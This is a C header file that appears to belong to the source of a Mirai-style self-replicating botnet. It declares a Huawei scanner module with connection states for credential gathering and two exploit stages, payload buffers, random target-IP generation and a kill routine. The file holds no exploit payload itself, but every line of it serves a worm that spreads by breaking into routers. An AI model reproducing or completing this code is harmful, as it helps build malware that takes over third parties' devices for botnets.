#ifdef SELFREP
#pragma once
#include <stdint.h>
#include "includes.h"
#define HUAWEI_SCANNER_MAX_CONNS   256
#define HUAWEI_SCANNER_RAW_PPS     788
#define HUAWEI_SCANNER_RDBUF_SIZE  1080
#define HUAWEI_SCANNER_HACK_DRAIN  64
struct huawei_scanner_connection
{
    int fd, last_recv;
    enum
    {
        HUAWEI_SC_CLOSED,
        HUAWEI_SC_CONNECTING,
        HUAWEI_SC_GET_CREDENTIALS,
        HUAWEI_SC_EXPLOIT_STAGE2,
        HUAWEI_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[HUAWEI_SCANNER_RDBUF_SIZE];
    char **credentials;
    char payload_buf[5000], payload_buf2[5000];
    int credential_index;
};
void huawei_scanner();
void huawei_kill(void);
static void huawei_setup_connection(struct huawei_scanner_connection *);
static ipv4_t get_random_huawei_ip(void);
#endif
